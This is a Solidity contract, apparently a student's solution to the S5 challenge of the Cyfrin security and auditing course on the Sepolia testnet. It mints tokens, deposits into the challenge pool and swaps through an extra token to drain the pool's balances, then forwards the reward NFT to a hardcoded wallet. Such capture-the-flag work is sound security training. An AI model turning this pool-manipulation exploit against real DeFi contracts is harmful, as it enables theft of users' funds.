// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {console} from "lib/forge-std/src/console.sol";

// Source: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file
// Challenge S5: https://sepolia.etherscan.io/address/0xdeb8d8efef7049e280af1d5fe3a380f3be93b648

interface IS5  { 
  // contract S5 address in Sepolia: 0xdeB8d8eFeF7049E280Af1d5FE3a380F3BE93B648 // It changes all the time
  function solveChallenge(string memory yourTwitterHandle) external;
  function description() external pure returns (string memory);
  function getPool() external view returns (address);
  function getTokenA() external view returns (address);
  function getTokenB() external view returns (address);
  function getTokenC() external view returns (address);
  function hardReset() external;
}

interface IS5Pool is IERC20 {
  function deposit(uint256 amount, uint64 deadline) external;
  function redeem(uint64 deadline) external;
  function swapFrom(IERC20 tokenFrom, IERC20 tokenTo, uint256 amount) external;
}

interface IS5Token is IERC20 {
  function mint(address to) external;
}

contract S5_Challenge is IERC721Receiver {

    address private owner;
    // This is my wallet address where NFT will be stored
    address private myWallet = 0x05E3Bd725678352E24d79D2266e12129EdB69474; 

    // Contract instances
    IS5 public s5;
    IS5Pool s5Pool;
    IS5Token private s5TokenA; // IERC20 private someToken = IERC20("0x..") // Token contract address
    IS5Token private s5TokenB;
    IS5Token private s5TokenC;
    uint256 private constant PRECISION = 1e18;

    constructor(address _s5) {
      owner = msg.sender; 
      s5 = IS5(_s5);

      s5Pool = IS5Pool(s5.getPool());
      s5TokenA = IS5Token(s5.getTokenA());
      s5TokenB = IS5Token(s5.getTokenB());
      s5TokenC = IS5Token(s5.getTokenC());
    }


    function solve() public {
      console.log("solve...");
        mintTokensAndDeposit();
        reedemToLocal();

        swap();

        s5.solveChallenge("chamdev1");
    }



    function reedemToLocal() internal {
        s5Pool.redeem(uint64(block.timestamp));
    }


    function mintTokensAndDeposit() internal {

        s5TokenA.mint(address(this));
        s5TokenB.mint(address(this));
        s5TokenC.mint(address(this));

        s5TokenA.approve(address(s5Pool), type(uint256).max);
        s5TokenB.approve(address(s5Pool), type(uint256).max);
        s5TokenC.approve(address(s5Pool), type(uint256).max);

        s5Pool.deposit(PRECISION, uint64(block.timestamp));
    }


    function swap() internal {
        s5Pool.swapFrom(s5TokenC, s5TokenA, PRECISION); 
        s5Pool.swapFrom(s5TokenA, s5TokenB, PRECISION); 
    } 


     function getBalancesFromS5() public view {
         uint256 balanceA = s5TokenA.balanceOf(address(s5));
         uint256 balanceB = s5TokenB.balanceOf(address(s5));
         uint256 balanceC = s5TokenC.balanceOf(address(s5));
         uint256 totalAB = balanceA + balanceB;

        console.log("The balance in S5 is: ");
        console.log("Token A: ", balanceA);
        console.log("Token B: ", balanceB);
        console.log("Token C: ", balanceC);
        console.log("TotalAB: ", totalAB);
        console.log("-----------------------------"); 
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {

      // Transfer the received ERC721 token to the specified wallet address
      IERC721(msg.sender).safeTransferFrom(address(this), myWallet, tokenId);

      return this.onERC721Received.selector;
    }

}